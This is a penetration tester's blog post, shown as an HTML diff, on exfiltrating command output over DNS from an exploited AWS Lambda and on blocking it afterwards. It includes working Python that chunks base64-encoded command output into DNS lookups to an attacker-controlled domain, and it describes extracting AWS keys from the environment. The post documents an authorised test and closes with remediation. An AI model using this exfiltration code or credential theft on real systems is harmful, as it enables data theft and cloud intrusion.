@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>What&#39;s in a Name? DNS Tunnelling &amp; AWS Lambda Exploitation (Part 2) :: Gladstomych</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+In Part 1 of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user – sbx_userNNN.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/blog/dns-tunnelling-aws-lambda-part-2/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="What&#39;s in a Name? DNS Tunnelling &amp; AWS Lambda Exploitation (Part 2)">
+<meta property="og:description" content="
+In Part 1 of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user – sbx_userNNN.
+" />
+<meta property="og:url" content="//localhost:1313/blog/dns-tunnelling-aws-lambda-part-2/" />
+<meta property="og:site_name" content="Gladstomych" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-06-13 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    ~/gladstomych
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/blog">Blog</a></li>
+        
+      
+        
+          <li><a href="/talks">Talks</a></li>
+        
+      
+        
+          <li><a href="/tools">Tools</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/blog" >Blog</a></li>
+        
+      
+        
+          <li><a href="/talks" >Talks</a></li>
+        
+      
+        
+          <li><a href="/tools" >Tools</a></li>
+        
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/blog/dns-tunnelling-aws-lambda-part-2/">What&rsquo;s in a Name? DNS Tunnelling &amp; AWS Lambda Exploitation (Part 2)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-06-13</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/burpsuite/">burpsuite</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/exploitation/">exploitation</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/network/">network</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/research/">research</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/aws/">aws</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/rce/">rce</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img src="/blog/dns-tunnelling-aws-lambda-part-2/unnamed.gif" alt="unnamed"></p>
+<p>In <a href="/blog/dns-tunnelling-aws-lambda/">Part 1</a> of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user – sbx_userNNN.</p>
+<p>In the first blog post, I spoke of the feature being powered by Lambda rather matter-of-factly, however during the penetration test, the &ldquo;sbx_u&rdquo; string was the first clue that the function I popped was powered by a Lambda.</p>
+<p>Screenshot showing decoding results of whoami:</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic1.png" alt="pic1"></p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic2.png" alt="pic2"></p>
+<p>After proving that RCE worked stably with limited data output in the application UI, I further discovered that although the app did not talk back via HTTP or HTTPS, it was making DNS requests to arbitrary domains. While BurpSuite&rsquo;s Collaborator functionality was working fine for demonstrating proof-of-concept interactions, it presented a couple of problems as I went further:</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic8.png" alt="pic8"></p>
+<ol>
+<li>Scalability &amp; UX – I didn&rsquo;t know at the time, but had vaguely remembered, that the exact data length limit of the DNS protocol was around 255 bytes total – need to RTFM (more detail on this later). But even at this point I knew I could not chuck thousands of bytes into a domain name and ask the poor Lambda to query for us. That meant we needed to split command outputs into multiple chunks at some point. Burp is written in Java and the UI (as seen above) would require manually clicking through hundreds of queries to copy and paste the data for further decoding. I needed a tool that either wrote each query to terminal or append to a file, that I could further decode and process.</li>
+<li>Privacy &amp; Cost – Honestly, avoiding manually clicking through hundreds of queries was a good enough reason to not proceed further in Burp. However, at that juncture my concerns also included privacy. If I proceeded further on this attack path, I would potentially be exfiltrating intellectual property of the client via the oastify.com domain, which was shared by all users of Burp Collaborator, including other pentesting providers and potentially cybercriminals. Not that I don&rsquo;t trust PortSwigger as a company, but I don&rsquo;t want to mess up some of the queries on my end and potentially send the encoded data to unknown entities.</li>
+<li>A final reason, which may not apply to us, but for those reading this article who are just starting out in Cyber – BurpSuite Collaborator is a paywalled feature and the annual enterprise licensing cost may be prohibitive for many hobbyists or learners.</li>
+</ol>
+<h3 id="moving-the-antenna-to-our-own-infrastructure">Moving the antenna to our own infrastructure<a href="#moving-the-antenna-to-our-own-infrastructure" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>So, is there a private, low-cost / free DNS interaction tool which outputs the log to either the terminal or a file, and works with a domain owned by us? Initially I had fleeting thoughts of spinning up a Bind9 DNS server on a VPS and use a couple of hacked-together shell scripts to do it, but then I thought, man, there are plenty of smart folks in my team who know either this tool or that tool off like the back of their hand, which would serve my specific purpose.</p>
+<p>I asked our techies for help. Initially our developer volunteered to adapt his custom DNS server written in Go for this purpose, but before we could see this big-brain moment through, he had other more pressing matters than pursuing this side quest (a failed motherboard I heard). Then another consultant introduced me to <a href="https://github.com/projectdiscovery/interactsh">Interactsh</a>, an open source tool maintained by ProjectDiscovery, designed to detect out-of-band (OOB) interactions. By default the oast.pro domain (I imagine owned by ProjectDiscovery) is used to catch queries, but one could buy a domain for a couple of bucks and tell the tool to point to it instead.</p>
+<p>Again DNS can be quite complicated if you&rsquo;re not that familiar with the protocol – so I&rsquo;ll briefly explain how the tool works here:</p>
+<pre tabindex="0"><code>[vuln app] ---makes DNS query A----&gt; [server]
+# then
+[client] --ask for records of OOB-----&gt; [server]
+[client] &lt;--sends DNS query A details-- [server]
+</code></pre><p>In part 1 of this series I explained how DNS exfiltration works, so go to the relevant sections if you want a refresher on that. In the case of Interactsh, the &ldquo;central server&rdquo; maintained by ProjectDiscovery would resolve queries pointing towards subdomains of oast.pro. As a bug bounty hunter, you use the interactsh client to connect to the central interactsh server and be given a unique id. Any OOB interaction caught by the server, which matches your unique ID would be sent to your client and be displayed on your terminal. Screenshot below is from the README of the project, showing how the ID matching works.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic9.png" alt="pic9"></p>
+<p>In comparison, shown below is how I set Interactsh up for the engagement. As described in part 1, I needed a domain where we can edit NS and A records. Let&rsquo;s say we own &ldquo;awesome-blogpost.com&rdquo; and I decided to use subdomains of &ldquo;subdomain.awesome-blogpost.com&rdquo; as the query catcher. I spun up a public facing VPS with a static IP address a.b.c.d, pointed the the NS record for the subdomain to it, much like the below (read part 1 if this doesn&rsquo;t make much sense):</p>
+<p>Set an NS record for <code>ns1.awesome-blogpost.com</code></p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic10.png" alt="pic10"></p>
+<p>So we first start our server on the publicly-facing VPS with domain specified and the server CLI would provide you have a client token, which is like a unique password for the client to connect to (says text in the screenshot because &ldquo;text&rdquo; was the actual subdomain I used in the engagement).</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic11.png" alt="pic11"></p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic12.png" alt="pic12"></p>
+<p>Then on my local machine, I connect to my server with with the client token and the <code>-dns-only</code> flag, and you can see a unique URL being provided as a OOB payload. If anything makes a DNS query to &ldquo;cnson… .text.awesome-blogpost.com&rdquo;, my server would catch it and show it to the client.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic13.png" alt="pic13"></p>
+<h3 id="encoding-adventures--weird-python-error--rtfm">Encoding adventures – weird Python error &amp; RTFM<a href="#encoding-adventures--weird-python-error--rtfm" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Before heading off to data encoding and the matter of writing a bootleg encoding protocol, let&rsquo;s first address one thing – DNS is not meant for transmitting arbitrary length messages. I found out the hard way when trying to pipe <code>/etc/passwd</code> (pentester&rsquo;s favorite!) through the wire – that Python complained of this (on my local testing script):</p>
+<pre tabindex="0"><code>Traceback (most recent call last):
+  File &#34;/usr/lib/python3.10/encodings/idna.py&#34;, line 163, in encode
+    raise UnicodeError(&#34;label empty or too long&#34;)
+UnicodeError: label empty or too long
+</code></pre><p>To replicate this at home, you can try to run this:</p>
+<pre tabindex="0"><code>python3 -c &#39;import socket; longname = &#34;A&#34; * 1000; req = socket.gethostbyname(f&#34;{longname}.example.com&#34;)&#39;
+</code></pre><p>What happened in that one command was Python being asked to do a DNS request for &ldquo;AAAAA…(1000 of A&rsquo;s)…AAA.example.com&rdquo;. Searching for that error on Google landed me on a <a href="https://stackoverflow.com/questions/51901399/python-requests-encoding-with-idna-codec-failed-unicodeerror-label-empty-o">StackOverflow question</a> where a dev encountered the same error. A knowledgeable user answered the question explaining that it was actually not a &ldquo;Unicode error&rdquo; but rather a DNS protocol error, implicating the cause being the subdomain within a DNS query being way too long, quote:</p>
+<p>It seems this is an issue from the <code>socket</code> module. It fails when the URL&rsquo;s hostname exceeds 64 characters.</p>
+<blockquote>
+<p>This is still an open issue <a href="https://bugs.python.org/issue32958">https://bugs.python.org/issue32958</a></p>
+</blockquote>
+<p>Digging deeper into the bug report linked, another user wrote, quote:</p>
+<blockquote>
+<p>The error can be consistently reproduced when the first substring of the url hostname is greater than 64 characters long, as in &ldquo;0123…..90123.example.com&rdquo;. This wouldn&rsquo;t be a problem, … so the entire &ldquo;[user]:[secret]@XXX&rdquo; section must be less than 65 characters long.</p>
+</blockquote>
+<p>During the pentest I took the explaination as is because 64-byte limit sounded right, though I actually limited my encoding to 60-byte in total for some imagined &ldquo;leeway&rdquo;. When writing this blog post, I read the <a href="https://www.rfc-editor.org/rfc/rfc1035">RFC1035 for DNS</a> to confirm this (and say I have RTFM&rsquo;d) and discovered, on page 7, that:</p>
+<blockquote>
+<p>The labels … must start with a letter, end with a letter or digit, and have as interior characters only letters, digits, and hyphen … Labels must be 63 characters or less.</p>
+</blockquote>
+<p>Turns out that those users were slightly wrong in that the maximum subdomain / hostname / label defined by the RFC was actually 63-bytes, not 64. You can verify this with tweaking the <code>longname</code> variable to 64 and 63 in the Python oneliner above. Knowing that the final messages will be maximally 63-byte chunks definitely helps.</p>
+<p>Next we need to think about other limitations of the DNS protocol. In the RFC we just referenced, it is also stated that a label must consist only of (case-insensitive) letters, digits and hyphen. With the input space (command output i.e. STDOUT) consisting of all printable Ascii, including symbols like <code>%^@*#|/</code>, <code>space</code> and <code>newline</code>, and the output space only consisting of letters, numbers and the unassuming hyphen <code>-</code>, it is clear that some sort of encoding scheme is needed.</p>
+<p>The solution I came up with was the unassuming Base64 encode. Ideally you would want to encrypt the data with something like AES256 CBC as is the case for &ldquo;production&rdquo; C2 frameworks like Cobalt Strike, but we are dealing with a UAT build so let&rsquo;s just roll with what we have.</p>
+<p>Before dealing with the message length, lets see how I implemented the encoding with the code snippet below – first we read the command output for popen() and encode into UTF-8 (because b64encode takes a byte sequence), then the payload was Base64 encoded, gets back a string with decode(&lsquo;UTF-8&rsquo;), and remove all the trailing <code>=</code> which might appear in b64 encoding.</p>
+<pre tabindex="0"><code>data = popen(&#39;uname -r&#39;).read().encode(&#39;UTF-8&#39;)
+payload = b64encode(data).decode(&#39;utf-8&#39;).replace(&#39;=&#39;,&#39;&#39;)
+url = f&#39;http://{payload}..subdomain.awesome-blogpost.com&#39;
+lookup = gethostbyname(url)
+</code></pre><p>On Interactsh, we should get back the encoded output:</p>
+<pre tabindex="0"><code>[NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK.&lt;uuid&gt;.subdomain.awesome-blogpost.com.] received DNS interaction from 35....
+</code></pre><p>Using the <code>base64</code> cli utility, we would then get back the command output for <code>uname -r</code></p>
+<pre tabindex="0"><code>$ echo -n &#39;NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK&#39; | base64 -d
+5.10.216-225.855.amzn2.x86_64
+</code></pre><p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic7.png" alt="pic7"></p>
+<h4 id="chunks--ordering">Chunks &amp; Ordering<a href="#chunks--ordering" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>When I first learnt about how TCP worked, it fascinated me with the inner mechanisms of stateful sessions, message ordering, length and integrity checks, and so on. Basically the protocol involves chopping the sender&rsquo;s message into little chunks, and the receiver can receive them in any order, recombine the chunks, and get back the original message, with a check that a) the message is intact and, b) the message has ended. How brilliant!</p>
+<p>Now that I am about to chop my bootleg DNS messages into 60-odd byte chunks, the minimum that I need to implement is a system which gives a little index tag to the message, and when I get back the messages in any order, my decoder will be able to rearrange them, combine back the original message, and decode them as one.</p>
+<p>Below is how I implemented it (with a little bit of help from our friend ChatGPT…) – if the payload is less than 60 bytes long, we define that the number of segments is 0. Otherwise, it will just be the result of the length of the payload divided by 60 (e.g. for 80 byte payload, the number of segments is 2). We loop through the segments, cutting out <code>60*(n) to 60*(n+1) th</code> bytes, and finally add the index label before the payload in the final DNS query:</p>
+<pre tabindex="0"><code>    data = popen(&#39;ls /usr/bin&#39;).read().encode(&#39;UTF-8&#39;)
+    payload = b64encode(data).decode(&#39;utf-8&#39;).replace(&#39;=&#39;,&#39;&#39;)
+
+    if len(payload) % 60 == 0:
+        num_segments = 0
+    else:
+        num_segments = (len(payload) // 60) + 1
+
+    for i in range(num_segments):
+        start_index = i * 60
+        end_index = start_index + 60
+        segment = payload[start_index:end_index]
+        url = f&#39;{i}.{segment}..subdomain.awesome-blogpost.com&#39;
+</code></pre><p>And the glorious moment of seeing the results back:</p>
+<pre tabindex="0"><code>    _       __                       __       __
+   (_)___  / /____  _________ ______/ /______/ /_
+  / / __ \/ __/ _ \/ ___/ __ &#39;/ ___/ __/ ___/ __ \
+ / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
+/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/
+
+        projectdiscovery.io
+[INF] Listing 1 payload for OOB Testing
+[INF] .subdomain.awesome-blogpost.com
+
+[0.WwphbGlhcwphcmNoCmF3awpiMnN1bQpiYXNlMzIKYmFzZTY0CmJhc2VuYW1l.] Received DNS interaction (A) from 3.9.x.x at ...
+[1.CmJhc2VuYwpiYXNoCmJhc2hidWcKYmFzaGJ1Zy02NApiZwpjYS1sZWdhY3kK.] Received DNS interaction (A) from 3.9.x.x at ...
+[2.Y2F0CmNhdGNoc2VndgpjZApjaGNvbgpjaGdycApjaG1vZApjaG93bgpja3N1.] Received DNS interaction (A) from 35.177.x.x at ...
+[3.bQpjb21tCmNvbW1hbmQKY29yZXV0aWxzCmNwCmNzcGxpdApjdXJsCmN1dApk.] Received DNS interaction (A) from 18.134.x.x at ...
+[4.YXRlCmRkCmRmCmRpcgpkaXJjb2xvcnMKZGlybmFtZQpkbmYKZHUKZWNobwpl.] Received DNS interaction (A) from 35.177.x.x at ...
+[5.Z3JlcAplbnYKZXhwYW5kCmV4cHIKZmFjdG9yCmZhbHNlCmZjCmZnCmZncmVw.] Received DNS interaction (A) from 35.177.x.x at ...
+...
+</code></pre><p>Mouse over and copy the output, run it through a oneliner to remove the extra stuff, sort it, remove the duplicates, and decode the whole thing:</p>
+<pre tabindex="0"><code>$ xclip -o clip | cut -d &#39; &#39; -f 1 | sed &#39;s/\[//;s/\.\]//&#39; | sort -h | uniq &gt; output26; python3 decode2.py output26
+Decoded string:
+
+alias
+arch
+awk
+...
+ls
+md5sum
+microdnf
+mkdir
+...
+</code></pre><h3 id="look-at-me-i-am-the-lambda-now">Look at me, I am the Lambda now<a href="#look-at-me-i-am-the-lambda-now" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Now we are cooking! That&rsquo;s basically a semi-interactive shell (with a couple of extra steps). Each command we want to run we put it in the popen(), invoke the app&rsquo;s feature, get back results from Interactsh, and decode in Python. I&rsquo;ll skip the enumeration bit and jump straight to the post-exploitation. Knowing that we are inside of an AWS Lambda, there are quite a few angles to tackle and exploit this. For more information specific to Lambda exploitation, refer to <a href="https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/">Hacktricks&rsquo; articles on this</a>. Sadly the pentest timeline was approaching its end and I felt the need to go for the highest impact finding as soon as possible, instead of exploring with a leisurely pace. Having a way to get data out and run commands, we could read environmental variables to extract the AWS secret &amp; access keys of the application. With AWS credentials you can impersonate the application&rsquo;s identity and access (supposedly) whatever the app could access inside of the AWS tenant.</p>
+<p>This was the first method I demonstrated, showing how the &ldquo;AWS_ACCESS_KEY_ID&rdquo; was extracted with os.envrion.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic14.png" alt="pic14"></p>
+<p>The second method, reading the environmental vars from <code>/proc/self/environ</code>:</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic15.png" alt="pic15"></p>
+<p>To authenticate to AWS with these credentials on the cli, you first put the keys extracted into a profile in your <code>~/.aws/credentials</code> file like this:</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic16.png" alt="pic16"></p>
+<p>Running <code>sts get-caller-identity</code>, the <code>whoami</code> for aws cli, we can see that the authentication as the lambda was successful.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic17.png" alt="pic17"></p>
+<p>Then comes the somewhat anticlimatic end to the engagement. With bruteforcing cloud resources that the Lambda&rsquo;s identity could access, I found that everything returned empty except the IP ranges used, which honestly wasn&rsquo;t much. There were some other attack vectors pertaining the Lambda angle, such as the <code>/invocation/next</code> endpoint and so on, but avenues to further lateral movement and escalation within the AWS tenant appeared to be limited.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic18.png" alt="pic18"></p>
+<h3 id="epilogue--investigations-on-aws">Epilogue – Investigations on AWS<a href="#epilogue--investigations-on-aws" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Throughout the testing of this application I was in constant back-and-forth communications with the client to keep them up to date with my findings, and potential ways to remediate the vulnerabilities discovered. All in all, they were quite glad that we have discovered issues of this magnitude, and were shocked that the application could talk to the outside world via DNS when they supposedly &ldquo;blocked everything&rdquo;. In the report I suggested to look into built-in cloud DNS capabilities and blocking ports alone might not be enough to stop an &ldquo;air gapped&rdquo; cloud app from DNS tunnelling, especially the server-less kinds. (Think Lambda for AWS, or PowerApp for Azure).</p>
+<p>After delivering the report I couldn&rsquo;t stop thinking about this remediation bit because:</p>
+<ol>
+<li>I thought it should be possible to configure that capacity, but I&rsquo;m not 100% sure how to. So if I deployed a Lambda myself, I wasn&rsquo;t sure yet how it should be secured against this attack (besides not having an RCE, phew!).</li>
+<li>Or … what if there wasn&rsquo;t an AWS native thing you could just enable and call it a day? Could I have just found a CVE on AWS Lambda itself?</li>
+</ol>
+<p>So the lingering thought drove me to spin up my own Lambda which executed plain old Python 3.11. I set up the Network Security Group to block 0.0.0.0/0 on all the TCP and UDP ports, and gave it a go. Voila, the same issue, DNS tunnelling through and querying my Burp Collaborator. Okay, first step done. How to close it off?</p>
+<p>I searched around for a bit for strings like &ldquo;DNS Firewall&rdquo; within AWS and on Google. Soon I found this: &ldquo;Route 53 Resolver DNS Firewall&rdquo;, a billable service … that blocks port 53 after you have blocked port 53. I was like &ldquo;of course Jeff, I knew you&rsquo;d do this to us…&rdquo;.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic19.png" alt="pic19"></p>
+<p>To keep the setup description short, what you need to do is to create a rule group first. In configurations, as I needed a blanket block I defined a rule to block absolutely everything, then click add rule. If you need some DNS resolution for your internal domains, you could define a custom allowlist.</p>
+<p><img src="/blog/dns-tunnelling-aws-lambda-part-2/pic20.png" alt="pic20"></p>
+<p>After the rules are sorted, associate the rule group with a VPC that contains your application or VM, and it&rsquo;s all done! The Lambda was no longer querying random DNS servers for arbitrary domains.</p>
+<p>I hope you&rsquo;ve enjoyed this rather convoluted story about how an app test turned into me trying to implement a custom DNS tunnelling protocol not dissimilar to what you&rsquo;d see on C2 frameworks, just minus the encryption, stealth and redundancy bits. And then we investigated some obscure functionality invented by AWS to add to your cloud bill and block the same thing twice.</p>
+<p>The client definitely found it a very cool story during our debrief and allowed me to publish it, so although we&rsquo;re not gonna name names, thank you unnamed client! And thank you, the reader for making it to the end.</p>
+<hr>
+<p><em>Originally published on <a href="https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda/">JUMPSEC Labs</a></em></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h"></span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/blog/ssh-tunnelling-corporate-firewalls/" class="button inline prev">
+        &lt; [<span class="button__text">SSH Tunnelling to Punch Through Corporate Firewalls – Updated Take on One of the Oldest LOLBINs</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/blog/dns-tunnelling-aws-lambda/" class="button inline next">
+         [<span class="button__text">What&#39;s in a Name? Writing Custom DNS Tunnelling Protocol, Exploiting AWS Lambda Misconfiguration (Part 1)</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
